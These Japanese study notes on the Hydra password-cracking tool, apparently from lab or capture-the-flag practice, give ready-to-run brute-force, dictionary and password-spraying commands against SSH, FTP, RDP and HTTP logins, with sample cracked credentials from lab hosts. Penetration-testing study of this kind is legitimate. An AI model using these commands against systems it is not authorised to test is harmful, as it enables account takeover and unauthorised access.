```toc
```
## Hydraの使い方

Hydraは、ログイン認証をクラックするためのパスワードクラッキングツールです。特にHTTP、FTP、SSHなど多くのプロトコルに対応しています。

## 1. 基本的な構文

```bash
hydra [オプション] [ターゲットIP] [プロトコル]
```
## 2. SSHに対するブルートフォース攻撃の例
特定のユーザー名とパスワードリストを使ってSSHサーバーに対してブルートフォース攻撃を行う例です。

```bash
hydra -l username -P /path/to/passwordlist.txt ssh://192.168.1.100
```
- -l username: 攻撃対象のユーザー名を指定します。
- -P /path/to/passwordlist.txt: 使用するパスワードリストのパスを指定します。
- ssh://192.168.1.100: 攻撃対象のSSHサーバーのIPアドレスを指定します。

## 3. HTTPフォームへのブルートフォース攻撃の例
特定のウェブサイトのログインフォームに対してブルートフォース攻撃を行う例です。

```bash

hydra -l admin -P /path/to/passwordlist.txt 192.168.1.100 http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect"
```
- http-post-form:HTTP POSTリクエストでフォームを送信します。
- /login.php: ログインフォームのあるページのパスを指定します。
- username=^USER^&password=^PASS^: フォームの入力フィールド名を指定し、^USER^と^PASS^でそれぞれユーザー名とパスワードが置き換えられます。
- F=incorrect: ログイン失敗時に表示される文字列を指定します。
### ユーザ名とパスワードをBase64でエンコードするWebサイトの場合
```zsh
hydra -I -f -L wordlists.txt -P wordlists.txt “http-post-form://192.168.160.61:8081/service/rapture/session:username=^USER64^&password=^PASS64^:F=403”
```
- -I 「再試行しない（Ignore an existing restore file）」途中で止めると hydra.restore というファイルを作って、再開した時に続きから実行できる仕組みがあります。
デフォルトだと、このリストアファイルがあると「途中から再開しますか？」と聞いてきます。

## 4. FTPへのブルートフォース攻撃の例
FTPサーバーに対してブルートフォース攻撃を行う例です。

```bash
hydra -l anonymous -p ftp_password 192.168.1.100 ftp
```
- -p ftp_password: 使用する単一のパスワードを指定します。
## 6. Hydraの結果を出力ファイルに保存する
攻撃結果をファイルに保存するには、-oオプションを使用します。

```bash
hydra -l username -P /path/to/passwordlist.txt ssh://192.168.1.100 -o results.txt
```
- -o results.txt: 結果をresults.txtに保存します。

```bash
hydra -L user.lst -e nsr ftp://10.0.10.13
```
- -L：ユーザリストファイルの指定
- -e nsr：nは"null"で空欄を設定、-sは"same"でユーザ名と同じパスワードを設定、-rは"reverse"でユーザ名を逆転したパスワードを設定
---
## SSH 辞書攻撃
```bash
# ターゲットがポート 2222 で SSH サービスを実行していることを確認
sudo nmap -sV -p 2222 192.168.220.201

# 情報収集プロセスを通じて、 georgeユーザーを既に発見していると 仮定
# cd /usr/share/wordlists/
# ls
# sudo gzip -d rockyou.txt.gz

hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.220.201
# [2222][ssh] host: 192.168.220.201   login: george   password: chocolate
```

## FTP 辞書攻撃
```bash
nmap 192.168.220.202
hydra -l itadmin -P /usr/shara/wordlists/rockyou.txt ftp://192.168.220.202
sudo ftp 192.168.220.202
itadmin
hellokitty
dir
get flag.txt
```

## RDP
## ブルートフォース攻撃の例
WindowsのRDP（リモートデスクトップ）サービスに対してブルートフォース攻撃を行う例です。

```bash
hydra -t 1 -V -f -l administrator -P /path/to/passwordlist.txt rdp://192.168.1.100
```
- -t 1: 1つのスレッドで攻撃を行う（リモートデスクトップのブルートフォース攻撃では推奨される設定）。
- -V: 攻撃の進行状況を表示します。
- -f: パスワードが見つかったら停止します。
## パスワードスプレー
```bash
# 有効なユーザーパスワード（SuperS3cure1337#）を既に取得済みであると仮定し、そのパスワードを様々なユーザーアカウント名に対して試行
# 取得したユーザを追記
echo -e "daniel\njustin" | sudo tee -a /usr/share/wordlists/dirb/others/names.txt

hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.220.202
# [3389][rdp] host: 192.168.220.202   login: daniel   password: SuperS3cure1337#
# [3389][rdp] host: 192.168.220.202   login: justin   password: SuperS3cure1337#
```

---
## HTTP POSTログインフォーム
以下の情報が必要
- ユーザ名とパスワードを指定するリクエストボディ
- ログイン失敗時のキャプチャ
1. Burpまたはブラウザから適当なID:PASSでログインし、そのrequestとresponseから情報を取得
![](../../../assets/images/Pasted%20image%2020260429101656.png)

2. Hydraで攻撃
```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.248.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
# [80][http-post-form] host: 192.168.248.201   login: user   password: 121212
```

## HTTP Basic Authentication
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt -f -vV 192.168.248.201 http-get /
# [80][http-get] host: 192.168.248.201   login: admin   password: 789456
```

